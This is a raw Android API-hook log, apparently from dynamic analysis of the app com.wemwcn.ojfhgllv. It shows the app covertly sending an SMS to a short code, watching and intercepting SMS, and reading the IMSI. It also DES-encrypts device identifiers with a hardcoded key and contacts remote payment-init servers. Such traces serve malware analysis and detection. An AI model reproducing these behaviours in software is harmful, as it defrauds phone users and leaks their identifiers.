D/S4URC   ( 3602): [SDK] [java.io.File] [exists] [FilePath][String] [/data/data/com.wemwcn.ojfhgllv/shared_prefs/dc.053CE9326103161DC37854ECE8E0DBE2.preferences.xml.bak]
D/S4URC   ( 3602): [SDK] [java.io.File] [renameTo] [FilePath][String] [/data/data/com.wemwcn.ojfhgllv/shared_prefs/dc.053CE9326103161DC37854ECE8E0DBE2.preferences.xml] [DesFile][/data/data/com.wemwcn.ojfhgllv/shared_prefs/dc.053CE9326103161DC37854ECE8E0DBE2.preferences.xml.bak]
D/S4URC   ( 3602): [SDK] [java.io.File] [getPath] [FilePath][String] [/data/data/com.wemwcn.ojfhgllv/shared_prefs/dc.053CE9326103161DC37854ECE8E0DBE2.preferences.xml]
D/S4URC   ( 3602): [SDK] [java.io.File] [delete] [FilePath][String] [/data/data/com.wemwcn.ojfhgllv/shared_prefs/dc.053CE9326103161DC37854ECE8E0DBE2.preferences.xml.bak]
D/S4URC   ( 3602): ]
D/S4URC   ( 3602): [SDK] [java.io.File] [exists] [FilePath][String] [/data/data/com.wemwcn.ojfhgllv/shared_prefs/dc.053CE9326103161DC37854ECE8E0DBE2.preferences.xml]
D/S4URC   ( 3602): [SDK] [java.io.File] [exists] [FilePath][String] [/data/data/com.wemwcn.ojfhgllv/shared_prefs/dc.053CE9326103161DC37854ECE8E0DBE2.preferences.xml.bak]
D/S4URC   ( 3602): [SDK] [java.io.File] [renameTo] [FilePath][String] [/data/data/com.wemwcn.ojfhgllv/shared_prefs/dc.053CE9326103161DC37854ECE8E0DBE2.preferences.xml] [DesFile][/data/data/com.wemwcn.ojfhgllv/shared_prefs/dc.053CE9326103161DC37854ECE8E0DBE2.preferences.xml.bak]
D/S4URC   ( 3602): [SDK] [java.io.File] [getPath] [FilePath][String] [/data/data/com.wemwcn.ojfhgllv/shared_prefs/dc.053CE9326103161DC37854ECE8E0DBE2.preferences.xml]
D/S4URC   ( 3602): [SDK] [java.io.File] [delete] [FilePath][String] [/data/data/com.wemwcn.ojfhgllv/shared_prefs/dc.053CE9326103161DC37854ECE8E0DBE2.preferences.xml.bak]
D/S4URC   ( 3602): ]
D/S4URC   ( 3602): [SDK] [java.lang.Class] [forName] [FindClass][String] [com.tendcloud.tenddata.TalkingDataGA]
D/S4URC   ( 3602): [SDK] [java.lang.Class] [forName] [FindClass][String] [com.umeng.analytics.game.UMGameAgent]
D/S4URC   ( 3602): [SDK] [java.lang.Class] [forName] [FindClass][String] [org.kxml2.io.KXmlParser]
D/S4URC   ( 3602): [SDK] [java.lang.Class] [forName] [FindClass][String] [org.kxml2.io.KXmlSerializer]
D/S4URC   ( 3602): [SDK] [java.lang.Class] [forName] [FindClass][String] [com.tendcloud.tenddata.TalkingDataGA]
D/S4URC   ( 3602): [SDK] [java.lang.Class] [forName] [FindClass][String] [com.umeng.analytics.game.UMGameAgent]
D/S4URC   ( 3602): [SDK] [java.io.File] [getPath] [FilePath][String] [/data/data/com.wemwcn.ojfhgllv]
D/S4URC   ( 3602): [SDK] [java.io.File] [getPath] [FilePath][String] [/data/data/com.wemwcn.ojfhgllv/databases]
D/S4URC   ( 3602): [SDK] [java.io.File] [isDirectory] [FilePath][String] [/data/data/com.wemwcn.ojfhgllv/databases]
D/S4URC   ( 3602): [SDK] [java.io.File] [mkdir] [FilePath][String] [/data/data/com.wemwcn.ojfhgllv/databases]
D/S4URC   ( 3602): [SDK] [java.io.File] [getPath] [FilePath][String] [/data/data/com.wemwcn.ojfhgllv/databases]
D/S4URC   ( 3602): [SDK] [android.telephony.SmsManager] [sendTextMessage] [DesADD] [106912114516407] [SourceADD] [null] [TextMessage] [452050246825819]
D/S4URC   ( 3602): [SDK] [java.io.File] [getPath] [FilePath][String] [/data/data/com.wemwcn.ojfhgllv/databases/dataeye_database_053CE9326103161DC37854ECE8E0DBE2.db]
D/S4URC   ( 3602): [SDK] [java.io.File] [Constructor] [FilePath][String] [/sys/devices/system/cpu/cpu0/cpufreq/scaling_cur_freq]
D/S4URC   ( 3602): [SDK] [java.io.File] [getPath] [FilePath][String] [/sys/devices/system/cpu/cpu0/cpufreq/scaling_cur_freq]
D/S4URC   ( 3791): [SDK] [java.io.File] [Constructor] [FilePath][String] [/system/app/webview/webview.apk]
D/S4URC   ( 3791): [SDK] [java.lang.Class] [forName] [FindClass][String] [com.android.webview.chromium.WebViewChromiumFactoryProvider]
D/S4URC   ( 3602): [SDK] [java.lang.ProcessBuilder] [Constructor] [Command][String] [,/system/bin/cat,/sys/devices/system/cpu/cpu0/cpufreq/cpuinfo_min_freq]
D/S4URC   ( 3602): [SDK] [java.lang.Class] [forName] [FindClass][String] [android.os.SystemProperties]
D/S4URC   ( 3791): [SDK] [java.lang.Runtime] [loadLibrary] [SoPath][String] [webviewchromium]
D/S4URC   ( 3791): [SDK] [java.io.File] [getPath] [FilePath][String] [/system/app/webview/lib/arm]
D/S4URC   ( 3791): [SDK] [java.io.File] [getPath] [FilePath][String] [/system/app/webview/lib/arm/libwebviewchromium.so]
D/S4URC   ( 3791): [SDK] [java.lang.Runtime] [loadLibrary] [SoPath][String] [webviewchromium_plat_support]
D/S4URC   ( 3791): [SDK] [java.io.File] [getPath] [FilePath][String] [/system/app/webview/lib/arm]
D/S4URC   ( 3791): [SDK] [java.io.File] [getPath] [FilePath][String] [/system/app/webview/lib/arm/libwebviewchromium_plat_support.so]
D/S4URC   ( 3602): [SDK] [java.net] [HttpURLConnection] [URL][String] [http://sdk.shxz2016.cn:8000/zpayinit?type=1]
D/S4URC   ( 3791): [SDK] [java.io.File] [getPath] [FilePath][String] [/vendor/lib]
D/S4URC   ( 3791): [SDK] [java.io.File] [getPath] [FilePath][String] [/vendor/lib/libwebviewchromium_plat_support.so]
D/S4URC   ( 3791): [SDK] [java.io.File] [getPath] [FilePath][String] [/system/lib]
D/S4URC   ( 3791): [SDK] [java.io.File] [getPath] [FilePath][String] [/system/lib/libwebviewchromium_plat_support.so]
D/S4URC   ( 3791): [SDK] [java.io.File] [getPath] [FilePath][String] [/data/data/com.wemwcn.ojfhgllv/shared_prefs]
D/S4URC   ( 3791): [SDK] [java.io.File] [getPath] [FilePath][String] [/data/data/com.wemwcn.ojfhgllv/shared_prefs/WebViewChromiumPrefs.xml]
D/S4URC   ( 3791): [SDK] [java.io.File] [Constructor] [FilePath][String] [/data/data/com.wemwcn.ojfhgllv/shared_prefs/WebViewChromiumPrefs.xml.bak]
D/S4URC   ( 3791): [SDK] [java.io.File] [exists] [FilePath][String] [/data/data/com.wemwcn.ojfhgllv/shared_prefs/WebViewChromiumPrefs.xml]
D/S4URC   ( 3791): [SDK] [java.io.File] [canRead] [FilePath][String] [/data/data/com.wemwcn.ojfhgllv/shared_prefs/WebViewChromiumPrefs.xml]
D/S4URC   ( 3791): [SDK] [java.io.File] [getPath] [FilePath][String] [/data/data/com.wemwcn.ojfhgllv/shared_prefs/WebViewChromiumPrefs.xml]
D/S4URC   ( 3791): [SDK] [java.io.File] [exists] [FilePath][String] [/data/data/com.wemwcn.ojfhgllv/shared_prefs/WebViewChromiumPrefs.xml]
D/S4URC   ( 3791): [SDK] [java.io.File] [canRead] [FilePath][String] [/data/data/com.wemwcn.ojfhgllv/shared_prefs/WebViewChromiumPrefs.xml]
D/S4URC   ( 3791): [SDK] [java.io.File] [getPath] [FilePath][String] [/data/data/com.wemwcn.ojfhgllv/shared_prefs/WebViewChromiumPrefs.xml]
D/S4URC   ( 3791): [SDK] [android.content.ContextWrapper][getSharedPreferences] [File][WebViewChromiumPrefs.xml] [MODE][MODE_PRIVATE]
D/S4URC   ( 3602): [SDK] [java.io.File] [getPath] [FilePath][String] [/data/data/com.wemwcn.ojfhgllv/shared_prefs/sp_name_configcom.wyzf.plugin.d.h.xml]
D/S4URC   ( 3602): [SDK] [android.content.ContextWrapper][getSharedPreferences] [File][sp_name_configcom.wyzf.plugin.d.h.xml] [MODE][MODE_PRIVATE]
D/S4URC   ( 3791): [SDK] [java.io.File] [exists] [FilePath][String] [/data/data/com.wemwcn.ojfhgllv/shared_prefs/WebViewChromiumPrefs.xml.bak]
D/S4URC   ( 3602): [SDK] [android.content.ContextWrapper][getSharedPreferences] [File][sp_name_configcom.wyzf.plugin.d.h.xml] [MODE][MODE_PRIVATE] [Method][getString] [String][appCode] [Return][20104806]
D/S4URC   ( 3791): [SDK] [java.io.File] [exists] [FilePath][String] [/data/data/com.wemwcn.ojfhgllv/shared_prefs/WebViewChromiumPrefs.xml]
D/S4URC   ( 3602): [SDK] [java.io.File] [getPath] [FilePath][String] [/data/data/com.wemwcn.ojfhgllv/shared_prefs/sp_name_configcom.wyzf.plugin.d.h.xml]
D/S4URC   ( 3791): [SDK] [java.io.File] [canRead] [FilePath][String] [/data/data/com.wemwcn.ojfhgllv/shared_prefs/WebViewChromiumPrefs.xml]
D/S4URC   ( 3602): [SDK] [android.content.ContextWrapper][getSharedPreferences] [File][sp_name_configcom.wyzf.plugin.d.h.xml] [MODE][MODE_PRIVATE]
D/S4URC   ( 3791): [SDK] [java.io.File] [getPath] [FilePath][String] [/data/data/com.wemwcn.ojfhgllv/shared_prefs/WebViewChromiumPrefs.xml]
D/S4URC   ( 3602): [SDK] [android.content.ContextWrapper][getSharedPreferences] [File][sp_name_configcom.wyzf.plugin.d.h.xml] [MODE][MODE_PRIVATE] [Method][getString] [String][packCode] [Return][34112:465]
D/S4URC   ( 3791): [SDK] [java.io.File] [canRead] [FilePath][String] [/data/data/com.wemwcn.ojfhgllv/shared_prefs/WebViewChromiumPrefs.xml]
D/S4URC   ( 3791): [SDK] [java.io.File] [getPath] [FilePath][String] [/data/data/com.wemwcn.ojfhgllv/shared_prefs/WebViewChromiumPrefs.xml]
D/S4URC   ( 3791): [SDK] [android.content.ContextWrapper][getSharedPreferences] [File][WebViewChromiumPrefs.xml] [MODE][MODE_PRIVATE] [Method][getInt] [Int][lastVersionCodeUsed] [Return][300001]
D/S4URC   ( 3602): [SDK] [java.lang.Class] [forName] [FindClass][String] [android.telephony.MSimTelephonyManager]
D/S4URC   ( 3602): [SDK] [java.io.File] [Constructor] [FilePath][String] [/vendor/lib]
D/S4URC   ( 3602): [SDK] [java.lang.Class] [forName] [FindClass][String] [com.android.internal.telephony.Phone]
D/S4URC   ( 3602): [SDK] [java.io.File] [Constructor] [FilePath][String] [/system/lib]
D/S4URC   ( 3602): [SDK] [java.lang.Class] [forName] [FindClass][String] [com.android.internal.telephony.Phone]
D/S4URC   ( 3602): [SDK] [java.lang.Class] [forName] [FindClass][String] [com.android.internal.telephony.PhoneFactory]
D/S4URC   ( 3602): [SDK] [android.telephony.TelephonyManager] [getSubscriberId]
D/S4URC   ( 3602): [SDK] [java.io.File] [Constructor] [FilePath][String] [/proc/cpuinfo]
D/S4URC   ( 3602): [SDK] [java.io.File] [getPath] [FilePath][String] [/proc/cpuinfo]
D/S4URC   ( 3602): [SDK] [android.content.ContentResolver] [registerContentObserver] [URL][String] [content://sms/]
D/S4URC   ( 3602): [SDK] [android.content.ContextWrapper] [registerReceiver][IntentFilter][mj_receive_sms_action_internal,
D/S4URC   ( 3602): [SDK] [java.io.File] [getPath] [FilePath][String] [/data/data/com.wemwcn.ojfhgllv/databases/dataeye_database_053CE9326103161DC37854ECE8E0DBE2.db]
D/S4URC   ( 3602): [SDK] [android.database.sqlite.SQLiteDatabase] [execSQL] [ExecInfo][String] [DROP TABLE IF EXISTS dataeye_agenda_log]
D/S4URC   ( 3602): [SDK] [android.content.Intent] [Constructor] [IntentInfo][String] [com.door.pay.sdk.app.action]
D/S4URC   ( 3602): [SDK] [android.database.sqlite.SQLiteDatabase] [execSQL] [ExecInfo][String] [CREATE TABLE dataeye_agenda_log  (_id INTEGER PRIMARY KEY AUTOINCREMENT, type VARCHAR not null default '' , account_id VARCHAR not null default '' , agenda_data TEXT not null default ''   )]
D/S4URC   ( 3602): [SDK] [java.io.File] [Constructor] [FilePath][String] [/proc/meminfo]
D/S4URC   ( 3602): [SDK] [java.io.File] [getPath] [FilePath][String] [/proc/meminfo]
D/S4URC   ( 3602): [SDK] [java.io.File] [getPath] [FilePath][String] [/storage/sdcard0]
D/S4URC   ( 3602): [SDK] [android.os.Environment] [getExternalStorageDirectory] [DirectoryPath][String] [/storage/sdcard0]
D/S4URC   ( 3602): [SDK] [java.io.File] [getPath] [FilePath][String] [/storage/sdcard0]
D/S4URC   ( 3602): [SDK] [java.io.File] [getPath] [FilePath][String] [/data/data/com.wemwcn.ojfhgllv/shared_prefs]
D/S4URC   ( 3602): [SDK] [android.os.Environment] [getExternalStorageDirectory] [DirectoryPath][String] [/storage/sdcard0]
D/S4URC   ( 3602): [SDK] [java.io.File] [getPath] [FilePath][String] [/storage/sdcard0]
D/S4URC   ( 3602): [SDK] [java.io.File] [getPath] [FilePath][String] [/data/data/com.wemwcn.ojfhgllv/shared_prefs/pref.xml]
D/S4URC   ( 3602): [SDK] [java.io.File] [Constructor] [FilePath][String] [/data/data/com.wemwcn.ojfhgllv/shared_prefs/pref.xml.bak]
D/S4URC   ( 3602): [SDK] [java.io.File] [getPath] [FilePath][String] [/storage/sdcard0]
D/S4URC   ( 3602): [SDK] [java.io.File] [exists] [FilePath][String] [/data/data/com.wemwcn.ojfhgllv/shared_prefs/pref.xml]
D/S4URC   ( 3602): [SDK] [android.content.ContextWrapper][getSharedPreferences] [File][pref.xml] [MODE][MODE_PRIVATE]
D/S4URC   ( 3602): [SDK] [android.database.sqlite.SQLiteDatabase] [execSQL] [ExecInfo][String] [DROP TABLE IF EXISTS dataeye_history_log]
D/S4URC   ( 3602): [SDK] [android.telephony.TelephonyManager] [getSubscriberId]
D/S4URC   ( 3602): [SDK] [java.io.File] [exists] [FilePath][String] [/data/data/com.wemwcn.ojfhgllv/shared_prefs/pref.xml.bak]
D/S4URC   ( 3602): [SDK] [java.io.File] [exists] [FilePath][String] [/data/data/com.wemwcn.ojfhgllv/shared_prefs/pref.xml]
D/S4URC   ( 3602): [SDK] [java.io.File] [getPath] [FilePath][String] [/data/data/com.wemwcn.ojfhgllv/shared_prefs/pref.xml]
D/S4URC   ( 3602): [SDK] [android.content.ContextWrapper][getSharedPreferences] [File][pref.xml] [MODE][MODE_PRIVATE] [Method][getIong] [Iong][triggt] [Return][-1]
D/S4URC   ( 3602): [SDK] [android.database.sqlite.SQLiteDatabase] [execSQL] [ExecInfo][String] [CREATE TABLE dataeye_history_log  (_id INTEGER PRIMARY KEY AUTOINCREMENT, history_data VARCHAR not null default ''   )]
D/S4URC   ( 3602): [SDK] [android.content.ContextWrapper][getSharedPreferences] [File][pref.xml] [MODE][MODE_PRIVATE] [Method][getIong] [Iong][darkitvl] [Return][-1]
D/S4URC   ( 3602): [SDK] [android.content.ContextWrapper][getSharedPreferences] [File][pref.xml] [MODE][MODE_PRIVATE] [Method][putLong] [Key][triggt] [Value][1528968574120]
D/S4URC   ( 3602): [SDK] [android.database.sqlite.SQLiteDatabase] [execSQL] [ExecInfo][String] [PRAGMA user_version = 12]
D/S4URC   ( 3602): [SDK] [java.io.File] [Constructor] [FilePath][String] [/proc/cpuinfo]
D/S4URC   ( 3602): [SDK] [java.io.File] [getPath] [FilePath][String] [/proc/cpuinfo]
D/S4URC   ( 3602): [SDK] [java.io.File] [exists] [FilePath][String] [/data/data/com.wemwcn.ojfhgllv/shared_prefs/pref.xml]
D/S4URC   ( 3602): [SDK] [java.io.File] [getPath] [FilePath][String] [/data/data/com.wemwcn.ojfhgllv/shared_prefs/pref.xml]
D/S4URC   ( 3602): [SDK] [javax.crypto.spec.SecretKeySpec][Constructor] [KEY][86324958][type][DES][javax.crypto.Cipher][getInstance] [Cipher][DES/CBC/PKCS5Padding] [javax.crypto.Cipher][getInstance] [Cipher][DES/CBC/PKCS5Padding] [javax.crypto.Cipher][doFinal] [Data][123,34,105,109,115,105,34,58,52,53,50,48,53,48,50,52,54,56,50,53,56,49,57,44,34,105,99,99,105,100,34,58,34,56,57,56,52,48,53,48,53,49,55,49,52,50,49,53,53,54,48,54,49,34,44,34,110,101,116,84,121,112,101,34,58,49,44,34,97,112,112,67,111,100,101,34,58,50,48,49,48,52,56,48,54,44,34,112,97,99,107,67,111,100,101,34,58,34,51,52,49,49,50,58,52,54,53,34,44,34,115,100,107,86,101,114,115,105,111,110,34,58,34,53,46,49,46,57,34,44,34,112,97,99,107,97,103,101,78,97,109,101,34,58,34,99,111,109,46,119,101,109,119,99,110,46,111,106,102,104,103,108,108,118,34,44,34,109,97,99,34,58,34,55,99,58,100,100,58,57,48,58,101,98,58,102,98,58,54,48,34,44,34,108,97,99,34,58,34,48,34,44,34,99,105,100,34,58,34,48,34,44,34,97,99,116,105,111,110,34,58,50,44,34,109,111,100,101,108,34,58,34,103,97,108,97,120,121,115,53,34,44,34,100,105,115,112,108,97,121,34,58,34,54,48,48,120,57,57,52,34,44,34,115,121,115,86,101,114,115,105,111,110,34,58,34,53,46,49,46,49,34,125] [Return][zfcfSf3q6J6f+NF3cmEKu/LTM/5Mke/ztcAw+IZnqOJo0l/QuJrOSlDRILFKOZfZNMsRkO/er9ig2IYYJu8AybMCAurGnn63dDyi6taUgsNHCXMS+XGK7n9g9hvGzocHOtHjEvm6IgR7kFaqP9IMjUNwjIplTGVsCLAPryGnOS0TsaLD5ttGM/suSXPga5A+xoAD1jY4xoR9GM5w8X0c/pL/LVCcnh/FVNxqBs8eP33GtsYYL8RnOb86fOMXTRjE7N9J3akoThBZ+uQ7sd6i7JAj/s/unXX7jbaI1EJlMJjhxrEVzjqa/dlQzduQ08KtuCfnb4aHy+3TFFq/S4Iv3OJ1nAGPMNkw2h4XGzfFxpgzsJt6CbE2o5mPYjXf7NlFDvebEVSB5DL4T4nuNp+COxfijS3yLf0YRLQuo9f3huzAydZccA5gcS91cQMyH973VZN/9XdPJfPEbV9wtuhdBo0b91B+fO+PKaqDwcBnESZPdq2lABKE0uUTrYHT6ZpKxFENxBCmtE66jkvgxb3ZSjDuzo8/sA8x7OgH9vu10wMybzGKugYybhudEWwK4QhJmqoXAPE/s7/h7fiuwj2klku/XVlsoeDFmNZKrApD1RL+TjAiflf+QpN2pOsfz0RFw3EcHe3R0V/mf0CyKvFNoKYe8xARgMSKLX2FSnTz++qZDim84BnHheZ92MCqDfnacHM9uxfU5DxYkx5xrSB+7xfz54J8i9To1WMcl7m1XH61V64JC+aJHKTMWTcwCgkHJU7cmragZn11yGH2cka3ACjOFEDEQU6L6RyhbeBU4+h8NfRGah3aKtx+jN1XW29xO0f+YChkNfcpK05UBvqiTXt3OyOtrpW7jv2lb9ioi5gO+cnnEwIsrOD5+BoAdc8yipWrsXP4dsvI+ymBNi3K8a3aZyuQO0MmEjrE/sySCCw3omFeHOhWGz2HU4UJn6vLkWTl+ZXkzWhx0glvvR/RfYGgOwTcGdf2H+3aulJrS2Bw5BcrWPVlNywuIBGqRzRLBRK0iDIbA6wlGvHRqvo465rER8YnJkmepdcPBPnYQrykCYRZohEXjxXAFHiN1TQBiVnY+dEurhWM9tW6iTjoutoWQoDORb2aHD7TjgrAKsmxbeZFoY9ymCx1NgC2zWDqtssH/FpzwhiSzLgozHbPR6nKHWRIEqgb/7SEieNszxoc7b48jcnRzdZM2E+N5n4mp6K3O/6jpivXRH4ZdnhWA7YjhLyWwkB97v1NLiRtiM0=]
D/S4URC   ( 3602): [SDK] [java.io.File] [getPath] [FilePath][String] [/data/data/com.wemwcn.ojfhgllv/shared_prefs/pref.xml]
D/S4URC   ( 3791): [SDK] [java.io.File] [getPath] [FilePath][String] [/data/data/com.wemwcn.ojfhgllv]
D/S4URC   ( 3602): [SDK] [java.io.File] [getPath] [FilePath][String] [/data/data/com.wemwcn.ojfhgllv/shared_prefs/pref.xml]
D/S4URC   ( 3791): [SDK] [java.io.File] [exists] [FilePath][String] [/data/data/com.wemwcn.ojfhgllv/app_webview]
D/S4URC   ( 3791): [SDK] [java.io.File] [getPath] [FilePath][String] [/data/data/com.wemwcn.ojfhgllv/app_webview]
D/S4URC   ( 3602): [SDK] [java.io.File] [delete] [FilePath][String] [/data/data/com.wemwcn.ojfhgllv/shared_prefs/pref.xml.bak]
D/S4URC   ( 3602): [SDK] [java.io.File] [getPath] [FilePath][String] [/storage/sdcard0]
D/S4URC   ( 3602): [SDK] [android.database.sqlite.SQLiteDatabase] [execSQL] [ExecInfo][String] [insert  or replace into dataeye_agenda_log(type,account_id ,agenda_data)  values(?,?,?)] [Bind][3]
D/S4URC   ( 3602): [SDK] [java.io.File] [getPath] [FilePath][String] [/data/data/com.wemwcn.ojfhgllv/shared_prefs/pz_sharedpre_cmreaderlogininfo.xml]
D/S4URC   ( 3602): [SDK] [java.io.File] [getPath] [FilePath][String] [/data/data/com.wemwcn.ojfhgllv/databases]
D/S4URC   ( 3602): [SDK] [java.io.File] [Constructor] [FilePath][String] [/data/data/com.wemwcn.ojfhgllv/files/mj.apk]
D/S4URC   ( 3602): [SDK] [java.io.File] [exists] [FilePath][String] [/data/data/com.wemwcn.ojfhgllv/files/mj.apk]
D/S4URC   ( 3602): [SDK] [java.lang.Class] [forName] [FindClass][String] [com.android.internal.telephony.Phone]
D/S4URC   ( 3602): [SDK] [android.content.ContextWrapper] [registerReceiver][IntentFilter][SMS_SEND_ACTION,SMS_SEND_ACTION_GETPHONENUMBER,
D/S4URC   ( 3602): [SDK] [android.content.ContentResolver] [registerContentObserver] [URL][String] [content://sms]
D/S4URC   ( 3602): [SDK] [android.content.ContextWrapper] [registerReceiver][IntentFilter][zhang.pay.zdx.send,
D/S4URC   ( 3602): [SDK] [android.content.ContentResolver] [registerContentObserver] [URL][String] [content://sms]
D/S4URC   ( 3602): [SDK] [java.net] [HttpURLConnection] [URL][String] [http://112.74.111.56:9039/gamesit/puinit/data]
D/S4URC   ( 3602): [SDK] [java.net] [HttpURLConnection] [URL][String] [http://sdk.shxz2016.cn:8000/sp/targetInit.e?pid=1000100020001204&appid=3030&qcid=zyap3030_58470_100]
D/S4URC   ( 3602): [SDK] [java.io.File] [getPath] [FilePath][String] [/data/data/com.wemwcn.ojfhgllv/shared_prefs/sp_name_configmj.xml]
D/S4URC   ( 3602): [SDK] [java.io.File] [getPath] [FilePath][String] [/data/data/com.wemwcn.ojfhgllv/shared_prefs/tally_util_msg.xml]
D/S4URC   ( 3602): [SDK] [java.io.File] [delete] [FilePath][String] [/data/data/com.wemwcn.ojfhgllv/shared_prefs/tally_util_msg.xml.bak]
D/S4URC   ( 3791): [SDK] [android.content.ContextWrapper] [registerReceiver][IntentFilter][android.provider.Telephony.SMS_RECEIVED,
D/S4URC   ( 3791): [SDK] [android.content.ContentResolver] [registerContentObserver] [URL][String] [content://sms/]
D/S4URC   ( 3602): [SDK] [javax.crypto.spec.SecretKeySpec][Constructor] [KEY][86324958][type][DES][javax.crypto.Cipher][getInstance] [Cipher][DES/CBC/PKCS5Padding] [javax.crypto.Cipher][getInstance] [Cipher][DES/CBC/PKCS5Padding] [javax.crypto.Cipher][doFinal] [Data][123,34,105,109,115,105,34,58,52,53,50,48,53,48,50,52,54,56,50,53,56,49,57,44,34,105,99,99,105,100,34,58,34,56,57,56,52,48,53,48,53,49,55,49,52,50,49,53,53,54,48,54,49,34,44,34,110,101,116,84,121,112,101,34,58,49,44,34,97,112,112,67,111,100,101,34,58,50,48,54,52,55,50,48,55,44,34,112,97,99,107,67,111,100,101,34,58,34,48,48,48,54,49,54,95,51,52,49,49,50,34,44,34,115,100,107,86,101,114,115,105,111,110,34,58,34,52,46,50,46,49,34,44,34,112,97,99,107,97,103,101,78,97,109,101,34,58,34,99,111,109,46,119,101,109,119,99,110,46,111,106,102,104,103,108,108,118,34,44,34,109,97,99,34,58,34,55,99,58,100,100,58,57,48,58,101,98,58,102,98,58,54,48,34,44,34,108,97,99,34,58,34,48,34,44,34,99,105,100,34,58,34,48,34,44,34,97,99,116,105,111,110,34,58,50,44,34,109,111,100,101,108,34,58,34,103,97,108,97,120,121,115,53,34,44,34,100,105,115,112,108,97,121,34,58,34,54,48,48,120,57,57,52,34,44,34,115,121,115,86,101,114,115,105,111,110,34,58,34,53,46,49,46,49,34,125] [Return][zfcfSf3q6J6f+NF3cmEKu/LTM/5Mke/ztcAw+IZnqOJo0l/QuJrOSlDRILFKOZfZNMsRkO/er9ig2IYYJu8AybMCAurGnn63dDyi6taUgsNHCXMS+XGK7n9g9hvGzocHOtHjEvm6IgR7kFaqP9IMjUNwjIplTGVsCLAPryGnOS0TsaLD5ttGM/suSXPga5A+xoAD1jY4xoR9GM5w8X0c/pL/LVCcnh/FVNxqBs8eP33GtsYYL8RnOb86fOMXTRjE7N9J3akoThBZ+uQ7sd6i7JAj/s/unXX7jbaI1EJlMJjhxrEVzjqa/dlQzduQ08KtuCfnb4aHy+3TFFq/S4Iv3Oe4s4e3KEXEsflMXyoVdMkUZx6bqxnlu4JvCdRgBMPBXFMtlCDkBRMbNHq4WOJZr+XPzcF46r+11JSBKZ3PN9HRRjt+SJU3hJPyoZYAIvEoPlxjcK+vMix+eefAiYvRMxAHmrXT+Ko9Fdt/VbVbFEXU23M9gm3ZA/gQoxY07+qEjFtluaIvwXR+yZrBHxqwJXA0HM4ehNtLWhMlg6ZRpetFe2WeC8pQGhAQbctR/dcQqU4v1fAEy4aVRXHQM7PA3rFKDINRWOd8VTO+z82ayifbvv8KvZltKlt4PoKyoeV8h5KE9G3ql1Bkb7tf70A7Ur0pdwPlFEUsJhB3jG6UtXPg9yojgg96O/6ijYJd9pZCm9SDvqdpox6s2porAzycaOeOmUtid4S2EbRe+TOXmOIQ2ZqGVHeKGgHnUqpSWXilVhqF6dgoz9H5zvQRkzOJlIEEFFnrmK2z0F4TUJ8qgLH126x8oqyFNsq3cWHh++a9iULSZmFzmshTAm3RlFtFCEe8/dwaxRZdB8BfQtNZHh1X7GyVxFEgHw/dMLfVuX7piOgHY+97WjAv5lUSKZnyOepQvs1P92FkGk/8HCDShZOaqXg/3nw0ekoMQkMsVvQ4Wt09NWeZX/tRiP4M8hrEtNyMlG/Zp3TAT9N1w3X0x++PI2iqjSWJyKruUsdL0sZJUpM72hOzsNJXS6OKsmo2s2ozIdsJXY4fRnWGbHd88w0oeuS/pS7xw2gNP4NdAAGVRBp2UToGP/lDspOlI7BAB14iiymPSJTyHDQJ4u/c+hgHnmK//ulnco2EcnGqhBKSYZcQGYDOqW68PZ4l8taGPtdevOZiG1TNABTMP9aRSLXaCviXc9dumpGhG3R1CyN7Q5MuS5pwp/9dvceN/3FpXU/T4Ed1hwk5u3qATu4WlWI/d6/WwV8vWA==]
D/S4URC   ( 3602): [SDK] [java.io.File] [exists] [FilePath][String] [/data/data/com.wemwcn.ojfhgllv/files]
D/S4URC   ( 3602): [SDK] [java.io.File] [Constructor] [FilePath][String] [/data/data/com.wemwcn.ojfhgllv/files/log.dat]
D/S4URC   ( 3602): [SDK] [java.io.File] [exists] [FilePath][String] [/data/data/com.wemwcn.ojfhgllv/files/log.dat]
D/S4URC   ( 3602): [SDK] [java.io.File] [getPath] [FilePath][String] [/data/data/com.wemwcn.ojfhgllv/shared_prefs/pref.xml]
D/S4URC   ( 3602): [SDK] [android.content.ContextWrapper][getSharedPreferences] [File][pref.xml] [MODE][MODE_PRIVATE]
D/S4URC   ( 3602): [SDK] [android.telephony.TelephonyManager] [getSubscriberId]
D/S4URC   ( 3602): [SDK] [android.content.ContextWrapper][getSharedPreferences] [File][pref.xml] [MODE][MODE_PRIVATE] [Method][getIong] [Iong][triggt] [Return][1528968574120]
